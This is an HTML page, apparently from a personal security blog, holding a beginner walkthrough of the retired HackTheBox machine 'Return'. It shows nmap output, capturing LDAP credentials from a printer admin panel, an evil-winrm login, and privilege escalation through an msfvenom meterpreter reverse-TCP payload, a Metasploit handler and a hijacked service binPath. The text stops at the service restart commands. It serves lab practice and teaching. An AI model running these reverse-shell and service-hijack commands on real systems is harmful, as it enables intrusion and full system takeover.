@@ -1,0 +1,1325 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Breaking into systems, documenting the journey">
+      
+      
+        <meta name="author" content="Certifa">
+      
+      
+        <link rel="canonical" href="https://yourusername.github.io/writeups/htb/return/">
+      
+      
+        <link rel="prev" href="../../">
+      
+      
+        <link rel="next" href="../darkzero/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>Return - My Security Lab</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../stylesheets/cards.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hackthebox-return-walkthrough" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="My Security Lab" class="md-header__button md-logo" aria-label="My Security Lab" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Security Lab
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Return
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Certifa" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Certifa
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+  Writeups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../tools/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tools
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../cheatsheets/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Cheatsheets
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../blog/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="My Security Lab" class="md-nav__button md-logo" aria-label="My Security Lab" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Security Lab
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Certifa" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Certifa
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackTheBox
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Return
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Return
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Table of Contents
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#about" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        About
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TL;DR
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SETUP / NOTES
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-nmap-enum4linux-netcat-evil-winrm-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        - Nmap, Enum4linux, Netcat, Evil-winRM, Metasploit.
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RECON
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ENUMERATION
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EXPLOIT
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PRIVILEGE ESCALATION
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LESSONS LEARNED
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../darkzero/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DarkZero
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cheatsheets
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="hackthebox-return-walkthrough">🧠 HackTheBox - Return Walkthrough<a class="headerlink" href="#hackthebox-return-walkthrough" title="Permanent link">&para;</a></h1>
+<p><img src="../../../assets/writeups/return/logo.png" alt="DarkZero logo" style="width: 80%; max-width:></p>
+<hr />
+<h2 id="table-of-contents">Table of Contents<a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="#-hackthebox---return-walkthrough">🧠 HackTheBox - Return Walkthrough</a></li>
+<li><a href="#table-of-contents">Table of Contents</a></li>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#about">About</a></li>
+<li><a href="#tldr">TL;DR</a></li>
+<li><a href="#setup--notes">SETUP / NOTES</a></li>
+<li><a href="#recon">RECON</a></li>
+<li><a href="#enumeration">ENUMERATION</a></li>
+<li><a href="#exploit">EXPLOIT</a></li>
+<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+<li><a href="#lessons-learned">LESSONS LEARNED</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<hr />
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p><strong>Machine: Return</strong></p>
+<p><strong>Difficulty: Easy</strong></p>
+<p><strong>OS: Windows</strong></p>
+<p><strong>Points: 0</strong></p>
+<p><strong>Status: Retired</strong></p>
+<hr />
+<h2 id="about">About<a class="headerlink" href="#about" title="Permanent link">&para;</a></h2>
+<p>This walkthrough covers the full exploitation of the retired HackTheBox machine 'Return'. It is aimed at beginners but also covers privilege escalation steps and explains key tools and credentials used throughout the attack.</p>
+<hr />
+<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>Scan and enumerate ports (Nmap, enum4linux).</p>
+</li>
+<li>
+<p>nteract with the printer web panel to capture credentials via LDAP listener.</p>
+</li>
+<li>
+<p>Connect with Evil-winRM using captured creds (svc-printer user).</p>
+</li>
+<li>
+<p>Exploit Server Operators group by uploading a Meterpreter shell and modifying service binary path.</p>
+</li>
+<li>
+<p>Use Metasploit to catch SYSTEM shell and grab root flag.</p>
+</li>
+</ul>
+<h2 id="setup-notes">SETUP / NOTES<a class="headerlink" href="#setup-notes" title="Permanent link">&para;</a></h2>
+<h2 id="-nmap-enum4linux-netcat-evil-winrm-metasploit">- Nmap, Enum4linux, Netcat, Evil-winRM, Metasploit.<a class="headerlink" href="#-nmap-enum4linux-netcat-evil-winrm-metasploit" title="Permanent link">&para;</a></h2>
+<h2 id="recon">RECON<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-04 16:39 UTC
+Nmap scan report for 10.129.102.16
+Host is up (0.012s latency).
+
+PORT      STATE SERVICE       VERSION
+🟢[53/tcp    open  domain        Simple DNS Plus[0m
+🟢[80/tcp    open  http          Microsoft IIS httpd 10.0[0m
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: HTB Printer Admin Panel
+🟢[88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 16:58:44Z)[0m
+🟢[135/tcp   open  msrpc         Microsoft Windows RPC[0m
+🟢[139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn[0m
+🟢[389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)[0m
+🟢[445/tcp   open  microsoft-ds?[0m
+🟢[464/tcp   open  kpasswd5?[0m
+🟢[593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0[0m
+🟢[636/tcp   open  tcpwrapped[0m
+🟢[3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)[0m
+🟢[3269/tcp  open  tcpwrapped[0m
+🟢[5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)[0m
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+🟢[9389/tcp  open  mc-nmf        .NET Message Framing[0m
+🟢[47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)[0m
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+🟢[49664/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49665/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49666/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49667/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49671/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0[0m
+🟢[49675/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49677/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49680/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢[49697/tcp open  msrpc         Microsoft Windows RPC[0m
+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: 18m34s
+| smb2-time:
+|   date: 2025-10-04T16:59:42
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-04 16:41 UTC
+Nmap scan report for 10.129.102.16
+Host is up (0.018s latency).
+Not shown: 92 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+🟢53/udp   open          domain
+🟢88/udp   open          kerberos-sec
+🟢123/udp  open          ntp
+🟢137/udp  open|filtered netbios-ns
+🟢138/udp  open|filtered netbios-dgm
+🟢500/udp  open|filtered isakmp
+🟢4500/udp open|filtered nat-t-ike
+🟢5353/udp open|filtered zeroconf
+
+Nmap done: 1 IP address (1 host up) scanned in 138.69 seconds
+</code></pre></div>
+Based on our <code>nmap</code> scan we see that the target is a Windows machine with port 80 IFS <code>Internet Information Services</code>, 455 <code>SMB</code> and <code>Windows Remote Management</code> being available on port 5985.</p>
+<hr />
+<h2 id="enumeration">ENUMERATION<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<p>Lets enumerate further with <code>enum4linux</code>! A great tool that helps us get more information from Windows and Samba systems.</p>
+<p><img alt="enum4linux" src="../../../assets/writeups/return/enum4linux%201.png" /></p>
+<p>We get some useful information back, like that the domain name is <code>return</code> and the host is part of a domain not a workgroup. We will investigate the website before we take another look somewhere else.</p>
+<p><img alt="homepage" src="../../../assets/writeups/return/printerhomepage%202.png" /></p>
+<p>Nothing much to see here other then a picture of a printer. It's not interactable so let's just hop in the <code>Settings</code> section to see if there is something usefull there.</p>
+<p><img alt="printer settings" src="../../../assets/writeups/return/printersettings%203.png" /></p>
+<p>We are greeted by the printer settings. <code>Server Address</code> and <code>Server Port</code> makes me think we can connect to it with a listener open <code>Netcat - nc</code>. Knowing the username <code>svc-printer</code> to the printer is usefull!</p>
+<p>These devices store <code>LDAP</code> and <code>SMB</code> credentials, in order for the printer to query the user list from Active
+Directory. Let's set up a listener on port 389 <code>LDAP</code> and ofcourse change the <code>Server Address</code> to your ip <code>tun0</code>.</p>
+<p><img alt="nc ldap" src="../../../assets/writeups/return/nc%204.png" /></p>
+<p>We have recieved the credentials from the printer!</p>
+<p><code>1edFg43012!!</code></p>
+<hr />
+<h2 id="exploit">EXPLOIT<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>With that being ours now, we can try to connect to the service using <code>Evil-winRM</code>. with classifying the <code>-i</code> target ip, <code>-u</code> username being the svc-printer and ofcourse <code>-p</code> password being <code>1edFg43012!!</code></p>
+<p><code>evil-winrm -i 10.129.102.16 -u svc-printer -p '1edFg43012!!'</code></p>
+<p><img alt="evilrm connection" src="../../../assets/writeups/return/evilwinrm%205.png" /></p>
+<p>We have connection to the service!</p>
+<p>Let's go to Desktop if the <code>userflag</code> is there.</p>
+<p><img alt="userflag" src="../../../assets/writeups/return/userflag%206.png" /></p>
+<p>And ofcourse the userflag is located in Desktop.</p>
+<hr />
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>Enumerating further with
+ - <code>net user svc-printer</code>
+we see that the group memberships reveals that <code>svc-printer</code> is part of <code>Server Operators</code>.</p>
+<p><img alt="net users" src="../../../assets/writeups/return/show%20net%20user%207.png" /></p>
+<p>More information about this is that members of this group can start and stop services. With that in mind we will modify a service binary path to obtain a reverse shell.</p>
+<p>The best and <code>stable</code> way is to use <code>msfvenom</code>. We will use this to generate a <code>meterpreter reverse shell executable payload</code> for the remote host.</p>
+<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe &gt; shell-x86.exe</code></li>
+</ul>
+<p>Using <code>tun0</code> will set your ip automatically.</p>
+<p><img alt="msfvenom" src="../../../assets/writeups/return/msfvenom%208.png" /></p>
+<p>Great, we have made a shell! With the current <code>Evil-winRM</code> shell we have, we can upload the .exec to the remote host.</p>
+<p><img alt="shell" src="../../../assets/writeups/return/shell%209.png" /></p>
+<p>Next, we will use the Metasploit console to configure a listener for a reverse shell.</p>
+<p><code>msfconsole</code></p>
+<p>Select the <code>multi/handler</code> module which is used to listen from a compromised system.</p>
+<p><code>exploit/multi/handler</code></p>
+<p><img alt="multi/handler" src="../../../assets/writeups/return/multiculti%2010.png" /></p>
+<p>Now we will set the payload as <code>windows/meterpreter/reverse_tcp</code>, this will allows for a reverse <code>TCP</code> connection.</p>
+<p><code>set PAYLOAD windows/meterpreter/reverse_tcp</code></p>
+<p>Now set up your HOST and PORT.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0
+<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<p>After that type <code>run</code>.</p>
+<p><img alt="run" src="../../../assets/writeups/return/11.png" /></p>
+<p>We will go back to our <code>Evil-winRM</code> connection. We will use our shell and modify the service binary path to obtain a reverse shell.</p>
+<p><code>sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shell.exe"</code></p>
+<p><img alt="scexec" src="../../../assets/writeups/return/sc.exec%2012.png" /></p>
+<p>Succes!</p>
+<p>Having our <code>Metasploit</code> listener up, we have a few things left to do. Let's restart vss</p>
+<p><code>sc.exe stop vss</code>
+<code>sc.exe start vss</code></p>
